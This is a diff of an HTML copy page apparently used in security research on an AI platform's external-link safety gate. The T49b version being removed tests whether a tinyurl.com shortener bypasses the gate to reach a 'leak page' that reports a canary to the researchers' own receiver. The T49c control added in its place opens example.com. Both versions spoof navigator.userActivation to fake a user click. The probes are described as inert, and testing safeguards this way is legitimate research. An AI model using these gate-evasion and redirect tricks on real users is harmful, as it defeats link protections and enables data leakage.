@@ -1,16 +1,14 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>T49b clean copy page</title></head>
+<head><meta charset="utf-8"><title>T49c clean copy page</title></head>
 <body style="font-family:monospace;background:#111;color:#ccc;padding:20px">
-<h2 style="color:#f33">T49b CLEAN COPY PAGE (shortener gate probe) &mdash; click Copy, then paste into the playground editor</h2>
+<h2 style="color:#f33">T49c CLEAN COPY PAGE (gate calibration control: example.com) &mdash; click Copy, then paste into the playground editor</h2>
 <button id="copy" style="font-size:18px;padding:10px 20px">Copy code</button>
-<pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">// T49b - server-gate reputation probe: URL shortener (Pluto Security research canary)
-// The /ecosystem/url_safe gate is a SERVER-side reputation/allowlist decision
-// (T49a proved it parses URLs properly). This probe tests whether the SHARED,
-// high-reputation shortener domain (tinyurl.com) passes the gate silently -
-// while the link redirects to OUR OWN leak page (jsdelivr pinned, researcher-
-// owned repo) which reports the visit + canary fragment to OUR OWN receiver.
-// Inert canary: fake data string, all researcher-owned infrastructure.
+<pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">// T49c - gate calibration control: known-safe domain (Pluto Security research canary)
+// Re-verifies the baseline: T33 (days ago) showed example.com opening SILENTLY.
+// If example.com also shows the dialog NOW, today's T49a/T49b "dialog" results
+// are miscalibrated (per-session state / rate limit / gate change) and must be
+// reinterpreted. Inert: opens example.com, nothing else.
 (function () {
   try {
     Object.defineProperty(navigator, "userActivation", {
@@ -19,29 +17,29 @@
     });
   } catch (e) {}
 
-  var URL_T49B = "https://tinyurl.com/28cos7xs#d=T49b-tinyurl-canary";
+  var URL_T49C = "https://example.com/";
 
   var d = document;
   var box = d.createElement("div");
-  box.id = "t49b-box";
+  box.id = "t49c-box";
   box.style.cssText = "position:fixed;left:12px;bottom:12px;z-index:2147483647;font:12px Menlo,monospace;color:#ff5252;background:rgba(0,0,0,.85);border:1px solid #ff5252;border-radius:6px;padding:8px 10px;max-width:80vw;white-space:pre-wrap";
-  box.textContent = "T49b RESEARCH CANARY (inert) - firing in 1s...";
+  box.textContent = "T49c CONTROL (inert) - firing example.com in 1s...";
   d.body.appendChild(box);
 
   setTimeout(function () {
     var api = window.oai || window.openai || window.webplus;
     if (!api || !api.openExternal) {
-      box.textContent = "T49b: no oai.openExternal API found";
+      box.textContent = "T49c: no oai.openExternal API found";
       return;
     }
     try {
-      api.openExternal({ href: URL_T49B });
+      api.openExternal({ href: URL_T49C });
       box.textContent =
-        "T49b FIRED (inert):\ntinyurl.com/28cos7xs#d=T49b-tinyurl-canary\n\n" +
-        "new tab opens SILENTLY = shortener passes the gate\n" +
-        "dialog appears = tinyurl.com is also gated";
+        "T49c FIRED: https://example.com/\n\n" +
+        "new tab opens SILENTLY = gate calibrated (baseline holds)\n" +
+        "dialog = baseline CHANGED - today's results must be reinterpreted";
     } catch (e) {
-      box.textContent = "T49b threw: " + e;
+      box.textContent = "T49c threw: " + e;
     }
   }, 1000);
 })();
